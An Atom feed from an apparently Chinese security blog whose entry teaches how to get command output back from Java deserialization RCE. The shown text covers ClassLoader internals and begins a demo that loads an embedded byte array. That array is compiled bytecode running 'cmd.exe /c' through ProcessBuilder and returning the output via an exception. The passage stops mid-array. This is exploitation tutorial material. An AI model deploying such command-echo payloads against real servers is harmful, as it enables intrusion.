<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>像清水一般清澈透明</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-09T04:39:56.937Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Samny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java反序列化回显解决方案</title>
    <link href="http://yoursite.com/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://yoursite.com/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2020-06-01T11:01:42.000Z</published>
    <updated>2020-06-09T04:39:56.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>&emsp;&emsp; 这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己颓废了一段时间导致现在才公布。之后可能会断更一段时间关于代码审计方面文章，时间暂不确定。其实有几个题材早也确定，但是实在是没时间去整理素材，加上项目的更新，让我变得更加繁忙，在此给位先说一声对不起。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 大多数Java反序列化漏洞都能执行命令，导致RCE。小伙伴们有没有想过网络上大多数<code>payload</code>都是以弹计算机为止，但目标主机有没有弹计算机，或者执行其他的命令的时候我们是并不知道的，因为没有回显任何的结果。这篇文章以反序列化漏洞的回显为题，教你解决如何解决反序列化漏洞回显。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="defineclass异常回显"><a href="#defineclass异常回显" class="headerlink" title="defineclass异常回显"></a>defineclass异常回显</h1><p>&emsp;&emsp; defineclass是<code>java.lang.ClassLoader</code>类下的一个类方法，将字节码转化为Class类。<br><img src="https://img-blog.csdnimg.cn/20200605103739371.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605103901837.png" alt="在这里插入图片描述"></p><hr><h2 id="ClassLoder-类加载机制"><a href="#ClassLoder-类加载机制" class="headerlink" title="ClassLoder 类加载机制"></a>ClassLoder 类加载机制</h2><p>&emsp;&emsp; Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例。</p><p><img src="https://img-blog.csdnimg.cn/20200524095720286.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 类加载器有三个，根加载器<code>Bootstrap</code>、平台类加载器<code>PlatformClassLoader</code>以及用户类加载器<code>AppClassLoader</code>。用户也可以自定义类加载器，自定义的类加载器需要继承<code>ClassLoader</code>类。</p><p><img src="https://img-blog.csdnimg.cn/20200524110624558.png" alt="在这里插入图片描述"></p><hr><h2 id="类加载demo"><a href="#类加载demo" class="headerlink" title="类加载demo"></a>类加载demo</h2><p>&emsp;&emsp; 下面给出的是一个完整的用户自定义加载器加载类字节码的DEMO，Summer类字节码怎么获取下文会讲解，目前先看一下类加载器的实现。</p><blockquote><p>温馨提示：如果使用笔者在GitHub上项目，请先将Summer类删除，或者移到其他地方。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// Summer.class类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">103</span>, <span class="number">98</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, 